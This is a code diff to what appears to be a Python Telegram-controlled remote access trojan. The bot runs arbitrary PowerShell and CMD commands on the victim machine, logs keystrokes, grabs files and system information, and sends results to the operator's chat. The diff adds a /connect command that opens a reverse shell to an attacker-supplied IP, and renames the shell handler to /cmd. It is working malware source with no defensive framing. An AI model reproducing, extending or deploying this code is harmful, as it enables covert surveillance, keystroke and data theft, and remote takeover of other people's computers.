@@ -27,6 +27,7 @@ from Modules import (
     open_website,
     media_player,
     keylogger,
+    connect,
 )
 
 # Configuration
@@ -57,7 +58,7 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🛑 Stop Keylog", callback_data="stop_keylog")],
         [InlineKeyboardButton("🗣️ Text To Speech on client", callback_data="speak")],
         [InlineKeyboardButton("🖥️ Get System Information", callback_data="get_system_info")],
-        [InlineKeyboardButton("🔑 Perform Shell Commands", callback_data="shell_commands")],
+        [InlineKeyboardButton("🔑 Perform CMD Commands", callback_data="cmd_commands")],
         [InlineKeyboardButton("🗊 Get Specific File", callback_data="get_file")],
         [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
         [InlineKeyboardButton("⚠️ Show Alert Box", callback_data="show_popup")],
@@ -115,12 +116,12 @@ async def showPopup(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Usage: /show_popup <message>")
 
 
-async def shell_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cmd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     inputs = (update.message.text).split()
     if len(inputs) > 1:
         command = listToString(inputs[1:])
         cmd_output = subprocess.Popen(
-            f"powershell.exe {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            f"cmd.exe /c {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
         output, error = cmd_output.communicate()
         
@@ -133,7 +134,7 @@ async def shell_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await context.bot.send_message(chat_id=CHAT_ID, text=f"💻 Output:\n{response_text}")
     else:
-        await update.message.reply_text("⚠️ Usage: /shell <command>")
+        await update.message.reply_text("⚠️ Usage: /cmd <command>")
 
 
 async def open_websites(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -179,6 +180,16 @@ async def play_video_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text(f"🎬 {result}")
     else:
         await update.message.reply_text("⚠️ Usage: /playvideo <path>")
+
+
+async def connect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    inputs = (update.message.text).split()
+    if len(inputs) > 1:
+        ip = inputs[1] # Get the IP address
+        msg = connect.connect_reverse_shell(ip)
+        await update.message.reply_text(f"🔗 {msg}")
+    else:
+        await update.message.reply_text("⚠️ Usage: /connect <ip>")
 
 
 async def start_keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -376,10 +387,10 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await context.bot.send_message(chat_id=CHAT_ID, text="❌ No keylog file found.")
 
-    elif result == "shell_commands":
+    elif result == "cmd_commands":
         await context.bot.send_message(
             chat_id=CHAT_ID,
-            text="To perform shell commands, use /shell <command>",
+            text="To perform commands:\nPowerShell: /ps <command>\nCMD: /cmd <command>",
         )
 
     elif result == "open_website":
@@ -458,13 +469,14 @@ if __name__ == '__main__':
 
     application.add_handler(CommandHandler("start", main_menu))
     application.add_handler(CommandHandler("ps", ps_command))
+    application.add_handler(CommandHandler("cmd", cmd_command))
     application.add_handler(CommandHandler("speak", speak))
     application.add_handler(CommandHandler("show_popup", showPopup))
-    application.add_handler(CommandHandler("shell", shell_commands))
     application.add_handler(CommandHandler("open_website", open_websites))
     application.add_handler(CommandHandler("get_file", get_file))
     application.add_handler(CommandHandler("playaudio", play_audio_command))
     application.add_handler(CommandHandler("playvideo", play_video_command))
+    application.add_handler(CommandHandler("connect", connect_command))
     application.add_handler(CommandHandler("startkeylog", start_keylog_command))
     application.add_handler(CommandHandler("stopkeylog", stop_keylog_command))
     application.add_handler(CommandHandler("commands", main_menu))
